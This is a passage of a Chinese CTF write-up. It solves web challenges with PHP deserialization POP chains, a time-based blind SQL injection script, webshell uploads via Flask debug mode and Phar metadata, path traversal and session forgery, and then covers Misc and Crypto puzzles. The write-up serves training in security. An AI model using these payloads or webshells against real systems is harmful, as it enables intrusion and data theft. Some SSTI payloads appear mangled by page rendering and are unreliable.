+    public function __destruct()
+    {
+        system($this->cmd);
+    }
+}
+
+unserialize(waf(serialize(new GetFlag($_GET['key']))));
+```
+
+可控的属性为 `key` ，并且可以通过 waf 中的替换来实现反序列化逃逸的效果。
+
+Copy
+
+```
+$getFlag = new GetFlag('');
+echo '<br>'.serialize($getFlag).'<br>';
+echo waf(serialize($getFlag)).'<br>';
+// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
+// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
+```
+
+需要通过逃逸构造出 `";s:3:"cmd";s:4:"ls /";}` 共 24 个字符，又因为 bad 替换成 good 后即增加一位，因此需要循环 24 次 bad 来进行逃逸。
+
+Copy
+
+```
+$getFlag = new GetFlag(str_repeat("bad", 24).'";s:3:"cmd";s:4:"ls /";}');
+echo '<br>'.serialize($getFlag).'<br>';
+echo waf(serialize($getFlag)).'<br>';
+// O:7:"GetFlag":2:{s:3:"key";s:96:"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
+// O:7:"GetFlag":2:{s:3:"key";s:96:"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
+```
+
+构造 Payload 如下
+
+Copy
+
+```
+key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}
+```
+
+即可输出跟目录的内容，同理构造 Payload 如下
+
+Copy
+
+```
+key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
+```
+
+即可得到 flag。
+
+### [Week 4]More Fast
+
+- 
+
+  GC 回收
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+
+class Start{
+    public $errMsg;
+    public function __destruct() {
+        die($this->errMsg);
+    }
+}
+
+class Pwn{
+    public $obj;
+    public function __invoke(){
+        $this->obj->evil();
+    }
+    public function evil() {
+        phpinfo();
+    }
+}
+
+class Reverse{
+    public $func;
+    public function __get($var) {
+        ($this->func)();
+    }
+}
+
+class Web{
+    public $func;
+    public $var;
+    public function evil() {
+        if(!preg_match("/flag/i",$this->var)){
+            ($this->func)($this->var);
+        }else{
+            echo "Not Flag";
+        }
+    }
+}
+
+class Crypto{
+    public $obj;
+    public function __toString() {
+        $wel = $this->obj->good;
+        return "NewStar";
+    }
+}
+
+class Misc{
+    public function evil() {
+        echo "good job but nothing";
+    }
+}
+
+$a = @unserialize($_POST['fast']);
+throw new Exception("Nope");
+```
+
+> 在PHP中，使用 `引用计数` 和 `回收周期` 来自动管理内存对象的，当一个变量被设置为 `NULL` ，或者没有任何指针指向 时，它就会被变成垃圾，被 `GC` 机制自动回收掉 那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被 `GC` 机制回收，在回收的过程中，它会自动触发 `_destruct` 方法，而这也就是我们绕过抛出异常的关键点。
+>
+> https://xz.aliyun.com/t/11843
+
+当 Unserialize 运行失败时，则会对运行中的已经创建出来的类进行销毁，提前触发 __destruct 函数。
+
+触发 GC 机制的方法：
+
+- 
+
+  对象被 unset() 函数处理；
+
+- 
+
+  数组对象为 NULL 。
+
+Copy
+
+```
+<?php
+show_source(__FILE__);
+
+class B {
+  function __destruct() {
+    global $flag;
+    echo $flag;
+  }
+}
+
+$a=array(new B,0);
+
+echo serialize($a);
+
+// a:2:{i:0;O:1:"B":0:{}i:1;i:0;}
+// 数组:长度为2::{int型:长度0;类:长度为1:类名为"B":值为0 int型:值为1：int型;值为0
+```
+
+将第二个索引值设为空 ，就可以触发 GC 回收机制。
+
+POP 链如下：
+
+Copy
+
+```
+Start::__destruct()->Crypto::__toString()->Reverse::__get($var)->Pwn::__invoke()->Web::evil()
+```
+
+Copy
+
+```
+$p = new Pwn();
+$p->obj = new Web;
+$p->obj->func = "system";
+$p->obj->var = "ls /";
+$r = new Reverse();
+$r->func = $p;
+$c = new Crypto();
+$c->obj = $r;
+$s = new Start();
+$s->errMsg = $c;
+
+$a = array($s, 0);
+echo serialize($a);
+// a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:1;i:0;}
+```
+
+通过将第二个索引 `i:1` 修改为 `i:0` 即可出发 GC 回收机制，构造 Payload 如下
+
+Copy
+
+```
+fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:0;i:0;}
+```
+
+即可得到目录，再构造 Payload 如下即可得到 flag 。
+
+Copy
+
+```
+fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:0;i:0;}
+```
+
+### [Week 4]midsql
+
+Copy
+
+```
+$cmd = "select name, price from items where id = ".$_REQUEST["id"];
+$result = mysqli_fetch_all($result);
+$result = $result[0];
+```
+
+经过尝试无论输入什么正确的都只会回显 `你不会以为我真的会告诉你结果吧` ，猜测需要进行盲注，先通过构造不同的 Payload 判断哪些被进行了过滤需要进行绕过。
+
+经过测试，空格、等号被绕过了，可以通过 `/**/` 和 `like` 进行绕过。
+
+Copy
+
+```
+import time
+import socket
+import requests
+import requests.packages.urllib3.util.connection as urllib3_conn
+
+urllib3_conn.allowed_gai_family = lambda: socket.AF_INET
+
+session = requests.Session()
+def getDatabase():
+    results = []
+    for i in range(1, 1000):
+        print(f'{i}...')
+        start = -1 
+        end = 255
+        mid = -1
+        while start < end:
+            mid = (start + end) // 2
+            url = "http://c968b372-387a-4e4b-b157-b99e627c3a66.node5.buuoj.cn:81/"
+            params = {"id": f"1/**/and/**/if(ascii(substr(database(),{i},1))>{mid},sleep(1),1)#"}
+            ret = session.get(url, params=params)
+            assert ret.status_code == 200, f'code: {ret.status_code}'
+            assert '429 Too Many Requests' not in ret.text
+            if ret.elapsed.total_seconds() >= 1:
+                start = mid + 1
+            else:
+                end = mid
+            time.sleep(0.05)
+        if mid == -1:
+            break
+        results.append(chr(start))
+        print(''.join(results))
+    return ''.join(results)
+
+begin = time.time()
+getDatabase()
+print(f'time spend: {time.time() - begin}')
+
+"""
+1...
+c
+2...
+ct
+3...
+ctf
+4...
+time spend: 16.405414819717407
+"""
+```
+
+可以得出数据库名为 `ctf` 。
+
+Copy
+
+```
+params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'ctf'),{i},1))>{mid},sleep(1),1)#"}
+```
+
+可以得出表名为 `items` 。
+
+Copy
+
+```
+params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'ctf'/**/and/**/table_name/**/like'items'),{i},1))>{mid},sleep(1),1)#"}
+```
+
+可以得出字段名为 `id,name,price` 。
+
+Copy
+
+```
+params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{i},1))>{mid},sleep(1),1)#"}
+```
+
+可以得出值 `1lolita1000,520lolita's flag is flag{647190d8-7511-4386-b513-15440eb033be}1688` 。
+
+### [Week 4]Flask Disk
+
+根据题目已知框架为 Flask ，通过 `admin manage` 已知开启了 Debug 模式，在该模式下修改 `app.py` 会立即加载，通过 Upload 上传新的 `app.py` 。
+
+Copy
+
+```
+from flask import *
+import os
+
+app = Flask(__name__)
+@app.route('/')
+
+def index():
+    try:
+        cmd = request.args.get('1')
+        data = os.popen(cmd).read()
+        return data
+    except:
+        pass
+
+    return "1"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=5000,debug=True)
+```
+
+上传后通过构造 Payload 获得 flag 。
+
+Copy
+
+```
+1=cat /flag
+```
+
+### [Week 4]PharOne
+
+查看源代码可以发现提示 `class.php` ，通过查看可以得到源码如下。
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+class Flag{
+    public $cmd;
+    public function __destruct()
+    {
+        @exec($this->cmd);
+    }
+}
+@unlink($_POST['file']);
+```
+
+结合标题可以通过 Phar 反序列化来写入 WebShell ，经过随机上传发现存在文件类型检测。
+
+Copy
+
+```
+<?php
+highlight_file(__FILE__);
+class Flag{
+    public $cmd;
+}
+
+$a=new Flag();
+$a->cmd="echo \"<?=@eval(\\\$_POST[1]);\">/var/www/html/1.php";
+$phar = new Phar("1.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($a);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+```
+
+通过上传发现存在过滤 `!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)` ，可以通过 gzip 压缩进行绕过。
+
+Copy
+
+```
+$ gzip -f 1.phar
+$ mv 1.phar.gz 1.jpg
+```
+
+修改好后进行上传得到回显如下。
+
+Copy
+
+```
+Saved to: upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
+```
+
+再通过构造 Payload 如下即可上传恶意 WebShell 。
+
+Copy
+
+```
+// class.php
+file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
+```
+
+此时通过构造 Payload 如下即可获得 flag 。
+
+Copy
+
+```
+// 1.php
+1=system("cat /f*");
+```
+
+### [Week 4]InjectMe
+
+附件：Dockerfile
+
+Copy
+
+```
+FROM vulhub/flask:1.1.1
+ENV FLAG=flag{not_here}
+COPY src/ /app
+RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
+CMD [ "/start.sh" ]
+EXPOSE 8080
+```
+
+可以得出站点目录在 `/app` 中，通过查看图片 `110.jpg` 可以得到部分源码。
+
+![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FMmBwM1uiEHIBau4Mszpm%252Finjectme-1.jpg%3Falt%3Dmedia%26token%3Dfa0d4a39-3e78-4fc8-bbef-f7a8cda9a47a&width=768&dpr=4&quality=100&sign=cabe8464582a44808cce5bcd0c5b2165b949d82b7f1f777bd2f2412ea6964c49)
+
+可以发现 `../` 被替换成了空，但是可以通过类似双写的方法进行绕过从而实现路径穿越，构造 Payload 如下。
+
+Copy
+
+```
+/download?file=..././..././..././app/app.py
+```
+
+可以得到 `app.py` 的源码如下。
+
+Copy
+
+```
+import os
+import re
+
+from flask import Flask, render_template, request, abort, send_file, session, render_template_string
+from config import secret_key
+
+app = Flask(__name__)
+app.secret_key = secret_key
+
+
+@app.route('/')
+def hello_world():  # put application's code here
+    return render_template('index.html')
+
+
+@app.route("/cancanneed", methods=["GET"])
+def cancanneed():
+    all_filename = os.listdir('./static/img/')
+    filename = request.args.get('file', '')
+    if filename:
+        return render_template('img.html', filename=filename, all_filename=all_filename)
+    else:
+        return f"{str(os.listdir('./static/img/'))} <br> <a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg</a>"
+
+
+@app.route("/download", methods=["GET"])
+def download():
+    filename = request.args.get('file', '')
+    if filename:
+        filename = filename.replace('../', '')
+        filename = os.path.join('static/img/', filename)
+        print(filename)
+        if (os.path.exists(filename)) and ("start" not in filename):
+            return send_file(filename)
+        else:
+            abort(500)
+    else:
+        abort(404)
+
+
+@app.route('/backdoor', methods=["GET"])
+def backdoor():
+    try:
+        print(session.get("user"))
+        if session.get("user") is None:
+            session['user'] = "guest"
+        name = session.get("user")
+        if re.findall(
+                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
+                name):
+            abort(500)
+        else:
+            return render_template_string(
+                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)
+    except Exception:
+        abort(500)
+
+
+@app.errorhandler(404)
+def page_not_find(e):
+    return render_template('404.html'), 404
+
+
+@app.errorhandler(500)
+def internal_server_error(e):
+    return render_template('500.html'), 500
+
+
+if __name__ == '__main__':
+    app.run('0.0.0.0', port=8080)
+```
+
+通过分析 backdoor 函数可知需要进行 session 伪造来修改 `session['user']` ，通过源码可知 `secret_key` 位于 `config.py` 中，通过上述相同方法获取，回显如下。
+
+Copy
+
+```
+secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
+```
+
+Copy
+
+```
+$ python .\flask_session_cookie_manager3.py decode -s "y0u_n3ver_k0nw_s3cret_key_1s_newst4r" -c "eyJ1c2VyIjoiZ3Vlc3QifQ.ZgfcyA.YhCEWdSzBAAgOIUh5lmFU
+AoCqDY"
+{'user': 'guest'}
+```
+
+成功 decode 后，还需要进行绕过，编写一个 Python 脚本如下。
+
+Copy
+
+```
+import subprocess
+import requests
+
+payload = '<div data-gb-custom-block data-tag="set" data-i=''></div><div data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='l' data-32='~' data-33='s' data-34='10' data-35='10' data-36='0' data-37='/' data-38='))[' data-39='read'></div>'
+
+def getSession():
+    command = ['python', 'flask_session_cookie_manager3.py', 'encode', '-t',
+               "{{'user':'{0}'}}".format(payload), '-s',
+               "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"]
+    result = subprocess.run(command, capture_output=True, text=True)
+    output = result.stdout.strip()
+    return output
+
+
+a = getSession()
+print(a)
+
+url = "http://cc52e144-c6c3-4b89-abcc-472db5bf1e69.node5.buuoj.cn:81/backdoor"
+cookies = {"session": a}
+res = requests.get(url=url, cookies=cookies)
+print(res.text)
+
+"""
+竟然给<h1>app
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+start.sh
+sys
+tmp
+usr
+var
+y0U3_f14g_1s_h3re
+</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁
+"""
+```
+
+发现成功绕过并且获得 flag 文件名 `y0U3_f14g_1s_h3re` ，通过修改脚本如下即可得到 flag 。
+
+Copy
+
+```
+payload = '<div data-gb-custom-block data-tag="set" data-i=''></div><div data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='c' data-32='~' data-33='at' data-34='10' data-35='10' data-36='0' data-37='/y0U3_f14g_1s_h3re' data-38='))[' data-39='read'></div>'
+```
+
+## Misc
+
+### [Week 1]CyberChef's Secret
+
+Copy
+
+```
+来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)
+M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=
+```
+
+CyberChef 一把梭，flag 如下
+
+
+
+Copy
+
+```
+flag{Base_15_S0_Easy_^_^}
+```
+
+### [Week 1]机密图片
+
+通过 zteg 可以得到 flag。
+
+Copy
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ zsteg secret.png
+b1,r,lsb,xy         .. text: ":=z^rzwPQb"
+b1,g,lsb,xy         .. file: OpenPGP Public Key
+b1,b,lsb,xy         .. file: OpenPGP Secret Key
+b1,rgb,lsb,xy       .. text: "flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}"
+b3,b,lsb,xy         .. file: very old 16-bit-int big-endian archive
+b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo
+```
+
+### [Week 1]流量！鲨鱼！
+
+用 WireShark 打开后在过滤器中输入 `http.response.code==200` 可以得到所有成功访问的 http 请求。
+
+通过一个一个看可以发现一个特殊的请求，如下图
+
+![image-20240426221240324](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240426221240324.png)
+
+可以发现这是请求 flag 并且将 flag 以 base64 编码的形态输出，通过将值进行 base64 解码即可得到 flag。
+
+Copy
+
+```
+flag{Wri35h4rk_1s_u53ful_b72a609537e6}
+```
+
+### [Week 1]压缩包们
+
+通过 binwalk 可以知道这是个 zip 压缩包，用 010 打开后发现缺少了文件头，需要进行修改，如下图。
+
+![image-20240426221328890](C:\Users\HP\AppData\Roaming\Typora\typora-user-images\image-20240426221328890.png)
+
+修改后将后缀名修改为 zip ，解压得到 flag.zip 但打开压缩包会提示压缩包数据错误 - 该文件已损坏，再看看全局方式位标记是否有错。
+
+> https://mp.weixin.qq.com/s?__biz=MzAwNDcwMDgzMA==&mid=2651042332&idx=7&sn=ff5bb33bb0f49470a9140976d9ced3fa
+
+通过 010 可以看到压缩源文件数据的全局方式位标记为 `09 00` ，压缩源文件目录区的全局方式位标记 `00 00` ，将压缩源文件目录区的全局方式位标记也修改为 `09 00` 再打开压缩包发现压缩包正常了。
+
+在压缩包注释中存在一串 base64 编码内容如下
+
+Copy
+
+```
+SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==
+```
+
+解码内容如下
+
+Copy
+
+```
+I like six-digit numbers because they are very concise and easy to remember.
+```
+
+说明密码应该为 6 个数字，用 ARCHPR 进行爆破即可得到密码为 `232311` ，解压后即可得到 flag
+
+Copy
+
+```
+flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}
+```
+
+### [Week 1]空白格
+
+Copy
+
+```
+  
+```
+
+使用 VSCode 打开可以发现这是由 `换行符` 、`制表符` 和 `空格` 组成的内容，通过百度发现是 whitespace 语言。
+
+> https://www.w3cschool.cn/tryrun/runcode?lang=whitespace
+
+通过在线工具即可得到 flag 如下
+
+Copy
+
+```
+flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}
+```
+
+### [Week 1]隐秘的眼睛
+
+使用 SilentEye 进行 Decode 即可得到 flag，密钥用的是默认的。
+
+![img](https://writeup.owo.show/~gitbook/image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252Fxb8dtvA0iGfVA8P2hXtf%252F%25E9%259A%2590%25E7%25A7%2598%25E7%259A%2584%25E7%259C%25BC%25E7%259D%259B-1.png%3Falt%3Dmedia%26token%3D47ffcf4e-cb24-43cf-96d8-52b9fbe543e3&width=768&dpr=4&quality=100&sign=ade95233883cfca3e76025e1d66f531e3732a5bec818b48efb88fa946a85bcca)
+
+Copy
+
+```
+flag{R0ck1ng_y0u_63b0dc13a591}
+```
+
+### [Week 2]新建Word文档
+
+http://hi.pcmoe.net/buddha.html
+
+## Crypto
+
+### [Week 1]brainfuck
+
+密文如下
+
+Copy
+
+```
+++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>++++++.>----.<-----.>-----.>-----.<<<-.>>++..<.>.++++++.....------.<.>.<<<<<+++.>>>>+.<<<+++++++.>>>+.<<<-------.>>>-.<<<+.+++++++.--..>>>>---.-.<<<<-.+++.>>>>.<<<<-------.+.>>>>>++.
+```
+
+> https://www.splitbrain.org/services/ook
+
+Copy
+
+```
+flag{Oiiaioooooiai#b7c0b1866fe58e12}
+```
+
+### [Week 1]Caesar's Secert
+
+密文如下
+
+Copy
+
+```
+kqfl{hf3x4w'x_h1umjw_n5_a4wd_3fed}
+```
+
+> https://www.dcode.fr/caesar-cipher
+
+Copy
+
+```
+flag{ca3s4r's_c1pher_i5_v4ry_3azy}
+```
+
+### [Week 1]Fence
+
+密文如下
+
+Copy
+
+```
+fa{ereigtepanet6680}lgrodrn_h_litx#8fc3
+```
+
+栅栏密码，使用 CyberChef 可以解出来
+
+Copy
+
+```
+#recipe=Rail_Fence_Cipher_Decode(2,0)&input=ZmF7ZXJlaWd0ZXBhbmV0NjY4MH1sZ3JvZHJuX2hfbGl0eCM4ZmMz
+```
+
+Copy
+
+```
+flag{reordering_the_plaintext#686f8c03}
+```
+
+### [Week 1]Vigenère
+
+密文如下
+
+Copy
+
+```
+pqcq{qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0}
+```
+
+> https://www.dcode.fr/vigenere-cipher
+
+维吉尼亚密码解密，将密文丢进上述链接中，并设置
+
+Copy
+
+```
+Knowing a plaintext word: flag{
+```
+
+可以发现当 Key 前三位为 `KFC` 时存在 `flag{` ，故尝试让 Key 就等于 `KFC` ，发现就是 flag。
+
+Copy
+
+```
+flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}
+```
+
+### [Week 1]babyencoding
+
+密文如下
+
+Copy
+
+```
+part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=
+part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=
+part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S<R-C`Q9F8S87T`
+```
+
+前两个用 CyberChef 可以一把梭，结果如下。
+
+Copy
+
+```
+part 1 of flag: flag{dazzling_encoding#4e0ad4
+part 2 of flag: f0ca08d1e1d0f10c0c7afe422fea7
+```
+
+第三部分使用的是 UUEncode 编码
+
+> http://www.atoolbox.net/Tool.php?Id=731
+
+解密后可以得到第三部分
+
+Copy
+
+```
+part 3 of flag: c55192c992036ef623372601ff3a}
+```
+
+### [Week 1]Small d
+
+> https://github.com/pablocelayes/rsa-wiener-attack
+
+题目中的 e 很大，说明 d 就会很小，通过 Wiener 攻击来解出 d。
+
+Copy
+
+```
+from Crypto.Util.number import long_to_bytes
+from RSAwienerHacker import hack_RSA
+e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825
+n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433
+c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248
+d = hack_RSA(e, n)
+print(d)
+m = pow(c, d, n)
+print(long_to_bytes(m))
+```
+
+### [Week 1]babyrsa
+
+> 题目描述：很容易分解的n
+>
+> http://factordb.com/
+
+题目描述中给出 hint ，通过 factordb 分解 n ，可以得到以下数组。
+
+Copy
+
+```
+array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
+```
+
+分解所得均为素数，通过计算出 phi 即可得出结果。
+
+Copy
+
+```
+import gmpy2
+from Crypto.Util.number import long_to_bytes, isPrime
+
+n = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261
+e = 65537
+c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595
+
+array_p = [2217990919, 2338725373, 2370292207, 2463878387, 2706073949, 2794985117, 2804303069, 2923072267, 2970591037, 3207148519, 3654864131, 3831680819, 3939901243, 4093178561, 4278428893]
+
+phi = 1
+for p in array_p:
+    if isPrime(p):
+        phi *= (p - 1)
+    else:
+        exit(1)
+d = gmpy2.invert(e, phi)
+m = pow(c, d, n)
+print(long_to_bytes(m))
+```
+
+### [Week 1]babyxor
+
+Copy
+
+```
+from secret import *
+
+ciphertext = []
+
+for f in flag:
+    ciphertext.append(f ^ key)
+
+print(bytes(ciphertext).hex())
+# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2
+```
+
+知道明文前五位为 `flag{` ，通过异或密文前五位来得出 `key` ，python 脚本如下
+
+Copy
+
+```
+ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
+ciphertext = bytes.fromhex(ciphertext_hex)
+known_plaintext = b"flag{"
+partial_key = [ciphertext[i] ^ known_plaintext[i] for i in range(5)]
+print("Partial key:", bytes(partial_key))
+# Partial key: b'\x8f\x8f\x8f\x8f\x8f'
+```
+
+可以得出 key 为 `\x8f` ，通过遍历异或整串密文就可以得到 flag，脚本如下
+
+Copy
+
+```
+ciphertext_hex = "e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2"
+ciphertext = bytes.fromhex(ciphertext_hex)
+key = int.from_bytes(b'\x8f', 'big')
+print(bytes([ciphertext[i] ^ key for i in range(36)]))
+```
+
+### [Week 1]Affine
+
+Copy
+
+```
+from flag import flag, key
+
+modulus = 256
+
+ciphertext = []
+
+for f in flag:
+    ciphertext.append((key[0]*f + key[1]) % modulus)
+
+print(bytes(ciphertext).hex())
+
+# dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064
+```
+
+通过将明文的每个字符与 `key[0]` 相乘再加上 `key[1]` 模 256即可得到密文，因此把过程倒过来即可得到 flag。
+
+加密过程: $(key[0] * f + key[1])\ mod\ 256$
+
+因为进行模运算，逆过来需要先求出逆元，通过求出逆元就可以逆推得出 flag。
+
+解密过程: $key[0]^{-1} * (c-key[1])\ mod\ 256 $
+
+根据已知明文 `flag{` 爆破出逆元后通过解出的 `key[0]` 和 `key[1]` 代入求解即可，脚本如下
+
+Copy
+
+```
+def mod_inverse(a, m):
+    for x in range(1, m):
+        if (a * x) % m == 1:
+            return x
+    return None
+
+ciphertext = bytes.fromhex("dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064")
+
+known_text = b"flag{"
+
+for k0 in range(256):
+    for k1 in range(256):
+        inv_k0 = mod_inverse(k0, 256)
+        if not inv_k0:
+            continue
+        decrypted = [(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(known_text)]]
+        if bytes(decrypted) == known_text:
+            print(bytes([(inv_k0 * (c - k1)) % 256 for c in ciphertext[:len(ciphertext)]]))
+            break
+            
+# flag{4ff1ne_c1pher_i5_very_3azy}
+```
+
+### [Week 1]babyaes
+
+Copy
+
+```
+from Crypto.Cipher import AES
+import os
+from flag import flag
+from Crypto.Util.number import *
+
+
+def pad(data):
+    return data + b"".join([b'\x00' for _ in range(0, 16 - len(data))])
+
+
+def main():
+    flag_ = pad(flag)
+    key = os.urandom(16) * 2
+    iv = os.urandom(16)
+    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    enc_flag = aes.encrypt(flag_)
+    print(enc_flag)
+
+
+if __name__ == "__main__":
+    main()
+# 3657491768215750635844958060963805125333761387746954618540958489914964573229
+# b'>]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i'
+```
+
+由于 key 是由一段随机 16bit 的值复制两次拼接出来的值，并且给出了 $key\ \oplus\ iv\ \oplus\ 1$ 的值，因此可以先异或 1 得到 $key\ \oplus\ iv$ 的值。
+
+由于此时的 key 为 32bit，而 iv 为 16bit，因此解出来的值得前半段就是 key 值，再通过将前半段异或后半段即可得到 iv 值，脚本如下
